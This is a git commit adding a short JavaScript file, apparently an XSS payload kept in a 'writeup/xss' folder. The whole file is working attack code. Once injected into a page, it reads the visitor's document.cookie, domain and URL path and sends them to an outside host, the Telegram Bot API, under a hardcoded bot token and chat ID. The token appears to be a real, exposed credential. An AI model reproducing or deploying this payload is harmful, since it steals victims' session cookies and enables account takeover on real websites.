88688f401916eca7a543414aa1ccfad36fcb2d5a
Syukirman Amir <128995740+syukirman-amir@users.noreply.github.com>
2023-06-16 22:54:00 +0900

    Add files via upload

---
+++ writeup/xss/gesit.js
@@ -0,0 +1,12 @@
+
+
+var tokenBot = '6299530694:AAGQ4i4FThkwbr51cZZnL-Pt69uYa8EiW98'; // Your "tokenBot" Here
+var chatId = '480631913'; // Your "chatId" Here
+
+function telegramSend(tokenBot, chatId) {
+	var textData = '<b>XSS+Alert+in+' + document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document['location']['hostname'] + document['location']['pathname'] + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document['cookie'] + '</pre>';
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + textData + '&parse_mode=html', true);
+    xhr.send();
+}
+telegramSend(tokenBot, chatId)
